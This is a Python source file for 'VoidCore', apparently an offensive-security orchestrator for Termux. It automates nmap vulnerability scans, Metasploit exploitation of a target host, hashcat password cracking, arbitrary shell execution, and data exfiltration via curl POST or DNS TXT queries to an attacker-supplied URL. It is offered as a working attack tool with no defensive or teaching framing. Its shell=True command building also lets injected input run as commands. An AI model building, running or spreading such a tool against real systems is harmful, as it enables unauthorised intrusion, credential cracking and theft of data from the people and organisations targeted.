"""VoidCore orchestrator — standalone Termux execution engine."""

import subprocess
import logging
import json
from typing import Any, Dict, List, Optional

logger = logging.getLogger("voidcore.orchestrator")

class Orchestrator:
    """Autonomous task execution engine for Termux."""

    def __init__(self, config=None):
        self.config = config or {}
        self._task_counter = 0
        self._results = []

    def run(self, task_type, payload=None):
        self._task_counter += 1
        task_id = f"task_{self._task_counter:04d}"
        payload = payload or {}
        try:
            if task_type == "recon":
                result = self._recon(payload)
            elif task_type == "scan":
                result = self._scan(payload)
            elif task_type == "execute":
                result = self._execute(payload)
            elif task_type == "crawl":
                result = self._crawl(payload)
            elif task_type == "exploit":
                result = self._exploit(payload)
            elif task_type == "crack":
                result = self._crack(payload)
            elif task_type == "exfil":
                result = self._exfil(payload)
            elif task_type == "enum":
                result = self._enum(payload)
            else:
                result = {"message": "Unknown task type", "task_type": task_type}
            self._results.append({"task_id": task_id, "type": task_type, "result": result})
            return {"task_id": task_id, "status": "success", "result": result}
        except Exception as e:
            return {"task_id": task_id, "status": "error", "error": str(e)}

    def _shell(self, cmd, timeout=60):
        try:
            proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            return {"command": cmd, "stdout": proc.stdout.strip(), "stderr": proc.stderr.strip(), "returncode": proc.returncode, "status": "success" if proc.returncode == 0 else "failed"}
        except subprocess.TimeoutExpired:
            return {"command": cmd, "status": "timeout"}
        except Exception as e:
            return {"command": cmd, "status": "error", "error": str(e)}

    def _recon(self, p):
        t = p.get("target", ""); s = p.get("scan_type", "full")
        if s == "full": return self._shell(f"nmap -sV -sC -p- -T4 --script vuln {t}")
        if s == "quick": return self._shell(f"nmap -sV -sC -p 22,80,443,3306 {t}")
        return self._shell(f"nmap -sV {t}")

    def _scan(self, p):
        return self._shell(f"nmap -sV -sC -p {p.get('ports','1-65535')} -T4 {p.get('target','')}")

    def _execute(self, p):
        return self._shell(p.get("code", ""))

    def _crawl(self, p):
        return self._shell(f"curl -sL --max-redirs {p.get('depth',2)} {p.get('url','')}")

    def _exploit(self, p):
        t = p.get("target",""); port = p.get("port",""); exp = p.get("exploit","auto")
        if exp == "auto": return self._shell(f"msfconsole -q -x 'use exploit/multi/handler; set RHOST {t}; set RPORT {port}; exploit'")
        return self._shell(f"msfconsole -q -x 'use {exp}; set RHOST {t}; exploit'")

    def _crack(self, p):
        return self._shell(f"hashcat -m {p.get('hash_type','0')} {p.get('hash_file','')} {p.get('wordlist','/usr/share/wordlists/rockyou.txt')}")

    def _exfil(self, p):
        data = p.get("data",""); url = p.get("exfil_url",""); m = p.get("method","http")
        if m == "http": return self._shell(f"curl -X POST -d @{data} {url}")
        return self._shell(f"nslookup -q=TXT {data}.{url}")

    def _enum(self, p):
        return self._shell(f"nmap -p {p.get('port','445')} --script smb-enum-shares,smb-os-discovery {p.get('target','')}")

    def get_status(self):
        return {"engine": "voidcore", "version": "3.0.0", "platform": "termux", "tasks_executed": self._task_counter, "results_count": len(self._results)}

    def get_results(self):
        return self._results
